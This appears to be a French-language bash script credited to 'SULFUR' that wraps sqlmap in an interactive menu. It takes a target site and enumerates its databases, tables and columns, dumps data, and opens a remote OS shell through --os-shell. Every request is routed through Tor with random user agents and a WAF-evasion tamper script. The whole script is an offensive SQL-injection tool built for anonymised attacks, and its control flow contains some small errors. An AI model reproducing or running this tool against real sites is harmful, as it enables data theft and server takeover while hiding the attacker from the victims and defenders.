#!/bin/bash

clear
echo "'####::'######::'##:::'##::::'########:'########::::'###::::'##::::'##:"
echo ". ##::'##... ##: ##::'##:::::... ##..:: ##.....::::'## ##::: ###::'###:"
echo ": ##:: ##:::..:: ##:'##::::::::: ##:::: ##::::::::'##:. ##:: ####'####:"
echo ": ##::. ######:: #####:::::::::: ##:::: ######:::'##:::. ##: ## ### ##:"
echo ": ##:::..... ##: ##. ##::::::::: ##:::: ##...:::: #########: ##. #: ##:"
echo ": ##::'##::: ##: ##:. ##:::::::: ##:::: ##::::::: ##.... ##: ##:.:: ##:"
echo "'####:. ######:: ##::. ##::::::: ##:::: ########: ##:::: ##: ##:::: ##:"
echo "....:::......:::..::::..::::::::..:::::........::..:::::..::..:::::..::"
echo "                                                        BY SULFUR      "


read -p 'Entrez votre Site : ' nom
while [[ $nb != 5 ]]
do
echo "----------------------------------------------------"
echo "(1) - Afficher les bases"
echo "(2) - Afficher les tables"
echo "(3) - Afficher les colones"
echo "(4) - Afficher les donnees"
echo "(5) - Ouvrir un shell"
echo "(6) - Exit"
read -p 'Entrez votre choix : ' nb

if test $nb -eq 1
then
sqlmap --tor --tor-type=SOCKS5 -u "$nom" --dbs --random-agent --tamper /usr/share/sqlmap/tamper/space2mssqlblank.py
elif test $nb -eq 2 
read -p 'Base : ' db
then
sqlmap --tor --tor-type=SOCKS5 -u "$nom" -D "$db" --tables --tamper /usr/share/sqlmap/tamper/space2mssqlblank.py
elif test $nb -eq 3
then
read -p 'Table : ' tb
sqlmap --tor --tor-type=SOCKS5 -u "$nom" -D "$db" -T "$tb" --columns --tamper /usr/share/sqlmap/tamper/space2mssqlblank.py
read -p 'Colone : ' cl
elif test $nb -eq 4
then
sqlmap --tor --tor-type=SOCKS5 -u "$nom" -D "$db" -T "$tb" -C "$cl" --tamper /usr/share/sqlmap/tamper/space2mssqlblank.py --dump
elif test $nb -eq 5
then
sqlmap --tor --tor-type=SOCKS5 -u "$nom" -D "$db" -T "$tb" -C "$cl" --tamper /usr/share/sqlmap/tamper/space2mssqlblank.py --os-shell
elif test $nb -eq 6
then
exit
else
echo "Cest pas logique "
fi
done
